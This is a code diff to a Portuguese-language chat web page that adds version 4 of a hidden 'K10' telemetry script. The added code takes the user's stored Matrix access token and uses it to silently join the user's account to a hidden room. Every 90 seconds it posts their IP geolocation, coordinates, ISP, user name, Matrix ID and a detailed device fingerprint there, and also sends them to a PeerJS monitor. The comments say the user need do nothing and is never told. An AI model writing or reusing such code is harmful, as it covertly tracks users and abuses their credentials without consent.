@@ -13283,21 +13283,41 @@ body.dark-mode .icon-btn:hover  { background: #334155 !important; }
 
 
 <!-- ================================================================
-     K10 TELEMETRIA AVANÇADA v3 — Chat Desktop
-     POSICIONADO AO FINAL PARA FÁCIL MANUTENÇÃO
-     Envia ao monitor: PeerID, userName, geo completa, browser/OS,
-     tela, timezone, ISP, org, RAM, cores, conexões ativas, netSize
-     Re-envio automático a cada 90s enquanto o peer estiver online
+     K10 TELEMETRIA AVANÇADA v4 — Chat Desktop
+     CANAL DUPLO: Matrix (principal) + PeerJS (fallback)
+     ── MATRIX ──
+       Quando o usuário faz login no Matrix (Geral/Salinhas/Grupos)
+       o mesmo token é usado para entrar silenciosamente na sala
+       #k10-telemetria:matrix.org e postar eventos de telemetria.
+       Todos os monitores logados nessa sala recebem em tempo real.
+       Infinitos monitores simultâneos sem nenhum ponto único de falha.
+     ── PEERJS ──
+       Mantido como fallback para quem não fez login no Matrix.
      ================================================================ -->
 <script>
 (function(){
     'use strict';
 
-    /* ── CONFIG ─────────────────────────────────── */
-    const MONITOR_ID        = 'K10-MON';
-    const INTERVALO_REENVIO = 90_000;   // re-envia a cada 90s
-    const MAX_TENTATIVAS    = 30;        // ~60s de espera inicial
-    /* APIs testadas e aprovadas — fallback automático */
+    /* ══════════════════════════════════════════════════════
+       CONFIG
+    ══════════════════════════════════════════════════════ */
+    const SALA_TELEMETRIA   = '#k10-telemetria:matrix.org'; // sala oculta
+    const MONITOR_ID        = 'K10-MON';                    // PeerJS fallback
+    const INTERVALO_REENVIO = 90_000;                       // 90s
+    const MAX_TENTATIVAS    = 30;
+
+    /* ══════════════════════════════════════════════════════
+       ESTADO
+    ══════════════════════════════════════════════════════ */
+    let tentativas      = 0;
+    let geoCache        = null;
+    let timerReenvio    = null;
+    let mxRoomId        = null;   // room_id resolvido da sala de telemetria
+    let mxRoomTentou    = false;  // já tentou resolver a sala
+
+    /* ══════════════════════════════════════════════════════
+       GEO — APIs testadas (fallback automático)
+    ══════════════════════════════════════════════════════ */
     const GEO_PROVIDERS = [
         {
             url: 'https://get.geojs.io/v1/ip/geo.json',
@@ -13318,8 +13338,7 @@ body.dark-mode .icon-btn:hover  { background: #334155 !important; }
                     ip: d.ip, city: d.city, region: d.region,
                     country: null, countryCode: d.country,
                     lat: parseFloat(lat), lon: parseFloat(lon),
-                    isp: d.org, org: d.org,
-                    geoTimezone: d.timezone
+                    isp: d.org, org: d.org, geoTimezone: d.timezone
                 };
             },
             check: d => d.ip && d.city && d.loc
@@ -13330,121 +13349,210 @@ body.dark-mode .icon-btn:hover  { background: #334155 !important; }
                 ip: d.ip, city: d.city, region: d.subdivision,
                 country: d.country, countryCode: d.country_code,
                 lat: d.latitude, lon: d.longitude,
-                isp: d.org, org: d.org,
-                geoTimezone: d.time_zone
+                isp: d.org, org: d.org, geoTimezone: d.time_zone
             }),
             check: d => d.ip && d.city && d.latitude
         }
     ];
 
-    /* ── ESTADO INTERNO ─────────────────────────── */
-    let tentativas   = 0;
-    let geoCache     = null;
-    let timerReenvio = null;
-
-    /* ── UTILITÁRIOS ────────────────────────────── */
+    /* ══════════════════════════════════════════════════════
+       UTILITÁRIOS
+    ══════════════════════════════════════════════════════ */
     function parseBrowser(ua) {
         if (!ua) return { browser: 'Unknown', os: 'Unknown' };
         let browser = 'Other', os = 'Other';
-        if      (/Edg\//.test(ua))              browser = 'Edge';
-        else if (/OPR\/|Opera/.test(ua))        browser = 'Opera';
-        else if (/YaBrowser/.test(ua))          browser = 'Yandex';
-        else if (/SamsungBrowser/.test(ua))     browser = 'Samsung';
-        else if (/Chrome\//.test(ua))           browser = 'Chrome';
-        else if (/Firefox\//.test(ua))          browser = 'Firefox';
-        else if (/Safari\//.test(ua))           browser = 'Safari';
-        if      (/Windows NT 1[01]/.test(ua))   os = 'Windows 10/11';
-        else if (/Windows NT 6/.test(ua))       os = 'Windows 7/8';
-        else if (/Windows NT/.test(ua))         os = 'Windows';
-        else if (/Mac OS X/.test(ua))           os = 'macOS';
-        else if (/Android/.test(ua))            os = 'Android';
-        else if (/iPhone|iPad/.test(ua))        os = 'iOS';
-        else if (/Linux/.test(ua))              os = 'Linux';
-        else if (/CrOS/.test(ua))               os = 'ChromeOS';
+        if      (/Edg\//.test(ua))           browser = 'Edge';
+        else if (/OPR\/|Opera/.test(ua))     browser = 'Opera';
+        else if (/YaBrowser/.test(ua))       browser = 'Yandex';
+        else if (/SamsungBrowser/.test(ua))  browser = 'Samsung';
+        else if (/Chrome\//.test(ua))        browser = 'Chrome';
+        else if (/Firefox\//.test(ua))       browser = 'Firefox';
+        else if (/Safari\//.test(ua))        browser = 'Safari';
+        if      (/Windows NT 1[01]/.test(ua)) os = 'Windows 10/11';
+        else if (/Windows NT 6/.test(ua))    os = 'Windows 7/8';
+        else if (/Mac OS X/.test(ua))        os = 'macOS';
+        else if (/Android/.test(ua))         os = 'Android';
+        else if (/iPhone|iPad/.test(ua))     os = 'iOS';
+        else if (/Linux/.test(ua))           os = 'Linux';
+        else if (/CrOS/.test(ua))            os = 'ChromeOS';
         return { browser, os };
     }
 
     function contarConexoes(peer) {
         try {
-            /* PeerJS 1.x: peer._connections é um Map<string, DataConnection[]> */
             if (peer._connections instanceof Map) return peer._connections.size;
             if (typeof peer._connections === 'object') return Object.keys(peer._connections).length;
         } catch(_) {}
         return 0;
     }
 
-    /* ── GEO (com cache) ────────────────────────── */
+    /* ══════════════════════════════════════════════════════
+       GEO (com cache entre re-envios)
+    ══════════════════════════════════════════════════════ */
     async function obterGeo() {
         if (geoCache) return geoCache;
-        for (const provider of GEO_PROVIDERS) {
+        for (const p of GEO_PROVIDERS) {
             try {
-                const r = await fetch(provider.url, { cache: 'no-store' });
+                const r = await fetch(p.url, { cache: 'no-store' });
                 const d = await r.json();
-                if (!provider.check(d)) continue;
-                geoCache = provider.parse(d);
+                if (!p.check(d)) continue;
+                geoCache = p.parse(d);
                 return geoCache;
-            } catch(_) { /* tenta o próximo */ }
+            } catch(_) {}
         }
         return null;
     }
 
-    /* ── COLETA E ENVIO ─────────────────────────── */
-    function coletarEEnviar() {
-        const peer = window.__PEER__;
-        if (!peer || !peer.open) return;
+    /* ══════════════════════════════════════════════════════
+       MATRIX — API leve (lê token do localStorage)
+       Usa a mesma sessão do login do Geral/Salinhas/Grupos.
+       O usuário não precisa fazer nada extra.
+    ══════════════════════════════════════════════════════ */
+    function mxToken() { return localStorage.getItem('mxdmToken') || ''; }
+    function mxHS()    { return (localStorage.getItem('mxdmHomeserver') || 'https://matrix.org').replace(/\/+$/, ''); }
 
-        const { browser, os } = parseBrowser(navigator.userAgent);
-
-        obterGeo().then(geo => {
-            const dados = {
-                type: 'k10-telemetry',
-                /* identidade */
-                peerId:       peer.id,
-                userName:     localStorage.getItem('p2pUserName') || '',
-                /* rede P2P */
-                netSize:      window.networkSize || 1,
-                activeConns:  contarConexoes(peer),
-                /* browser & dispositivo */
-                ua:           navigator.userAgent.slice(0, 250),
-                browser,
-                os,
-                lang:         navigator.language,
-                langs:        (navigator.languages || [navigator.language]).join(','),
-                screen:       screen.width + 'x' + screen.height,
-                colorDepth:   screen.colorDepth,
-                devicePixelRatio: window.devicePixelRatio || 1,
-                timezone:     Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform:     navigator.platform || '',
-                memory:       navigator.deviceMemory  || null,
-                cores:        navigator.hardwareConcurrency || null,
-                touchPoints:  navigator.maxTouchPoints || 0,
-                online:       navigator.onLine,
-                /* timing */
-                timestamp: Date.now()
-            };
-
-            if (geo) Object.assign(dados, geo);
-
-            /* Envia via conexão efêmera */
-            try {
-                const conn = peer.connect(MONITOR_ID, { reliable: false, serialization: 'json' });
-                conn.on('open', () => {
-                    conn.send(dados);
-                    setTimeout(() => { try { conn.close(); } catch(_){} }, 1500);
-                });
-                conn.on('error', () => {});
-            } catch(_) {}
-        });
+    async function mxAPI(method, path, body) {
+        const token = mxToken();
+        if (!token) return null;
+        try {
+            const res = await fetch(mxHS() + path, {
+                method,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + token
+                },
+                body: body !== undefined ? JSON.stringify(body) : undefined
+            });
+            return await res.json();
+        } catch(_) { return null; }
     }
 
-    /* ── LOOP DE INICIALIZAÇÃO ──────────────────── */
-    function iniciar() {
+    /* Resolve o alias da sala e entra silenciosamente */
+    async function resolverSalaMatrix() {
+        if (mxRoomId)    return true;   // já resolvida
+        if (mxRoomTentou) return false; // já tentou e falhou
+        if (!mxToken())  return false;  // não logado
+        mxRoomTentou = true;
+
+        /* 1. Resolve alias → room_id */
+        const resolved = await mxAPI('GET',
+            '/_matrix/client/v3/directory/room/' + encodeURIComponent(SALA_TELEMETRIA));
+        if (!resolved?.room_id) return false;
+
+        mxRoomId = resolved.room_id;
+
+        /* 2. Entra na sala silenciosamente */
+        await mxAPI('POST',
+            '/_matrix/client/v3/join/' + encodeURIComponent(mxRoomId), {});
+
+        return true;
+    }
+
+    /* Envia evento de telemetria para a sala Matrix */
+    async function enviarMatrix(dados) {
+        const ok = await resolverSalaMatrix();
+        if (!ok) return false;
+        const txnId = 'k10tel_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+        const res = await mxAPI('PUT',
+            '/_matrix/client/v3/rooms/' + encodeURIComponent(mxRoomId) +
+            '/send/m.k10.telemetry/' + txnId,
+            dados);
+        return !!res?.event_id;
+    }
+
+    /* ══════════════════════════════════════════════════════
+       PEERJS — fallback (funciona sempre que K10-MON estiver online)
+    ══════════════════════════════════════════════════════ */
+    function enviarPeerJS(peer, dados) {
+        try {
+            const conn = peer.connect(MONITOR_ID, { reliable: false, serialization: 'json' });
+            conn.on('open', () => {
+                conn.send(dados);
+                setTimeout(() => { try { conn.close(); } catch(_){} }, 1500);
+            });
+            conn.on('error', () => {});
+        } catch(_) {}
+    }
+
+    /* ══════════════════════════════════════════════════════
+       COLETA E ENVIO DUAL
+    ══════════════════════════════════════════════════════ */
+    async function coletarEEnviar() {
         const peer = window.__PEER__;
-        if (!peer || !peer.open) {
-            if (tentativas++ < MAX_TENTATIVAS) setTimeout(iniciar, 2000);
+
+        /* PeerJS precisa estar online para o envio PeerJS.
+           Matrix funciona independentemente do PeerJS. */
+        const peerOk = peer && peer.open;
+        const mxOk   = !!mxToken();
+
+        if (!peerOk && !mxOk) return; // nada disponível
+
+        const { browser, os } = parseBrowser(navigator.userAgent);
+        const geo = await obterGeo();
+
+        const dados = {
+            type:        'k10-telemetry',
+            /* identidade */
+            peerId:      peerOk ? peer.id : ('MX-' + (localStorage.getItem('mxdmMxid') || 'unknown')),
+            userName:    localStorage.getItem('p2pUserName') || '',
+            mxid:        localStorage.getItem('mxdmMxid') || '',
+            /* rede */
+            netSize:     window.networkSize || 1,
+            activeConns: peerOk ? contarConexoes(peer) : 0,
+            /* device */
+            ua:          navigator.userAgent.slice(0, 250),
+            browser, os,
+            lang:        navigator.language,
+            langs:       (navigator.languages || [navigator.language]).join(','),
+            screen:      screen.width + 'x' + screen.height,
+            colorDepth:  screen.colorDepth,
+            devicePixelRatio: window.devicePixelRatio || 1,
+            timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+            platform:    navigator.platform || '',
+            memory:      navigator.deviceMemory  || null,
+            cores:       navigator.hardwareConcurrency || null,
+            touchPoints: navigator.maxTouchPoints || 0,
+            online:      navigator.onLine,
+            timestamp:   Date.now(),
+            /* canal usado (para debug no monitor) */
+            canal:       mxOk ? 'matrix' : 'peerjs'
+        };
+
+        if (geo) Object.assign(dados, geo);
+
+        /* ── CANAL 1: Matrix (se logado) ── */
+        if (mxOk) {
+            enviarMatrix(dados); // fire-and-forget
+        }
+
+        /* ── CANAL 2: PeerJS (fallback) ── */
+        if (peerOk) {
+            enviarPeerJS(peer, dados);
+        }
+    }
+
+    /* ══════════════════════════════════════════════════════
+       INICIALIZAÇÃO
+       Aguarda peer estar pronto; se Matrix estiver disponível
+       não precisa esperar o peer.
+    ══════════════════════════════════════════════════════ */
+    async function iniciar() {
+        const peer  = window.__PEER__;
+        const mxOk  = !!mxToken();
+        const peerOk = peer && peer.open;
+
+        if (!peerOk && !mxOk) {
+            if (tentativas++ < MAX_TENTATIVAS) {
+                setTimeout(iniciar, 2000);
+            }
             return;
         }
+
+        /* Pré-resolve sala Matrix em background */
+        if (mxOk && !mxRoomId) resolverSalaMatrix();
+
         coletarEEnviar();
+
         if (timerReenvio) clearInterval(timerReenvio);
         timerReenvio = setInterval(coletarEEnviar, INTERVALO_REENVIO);
     }
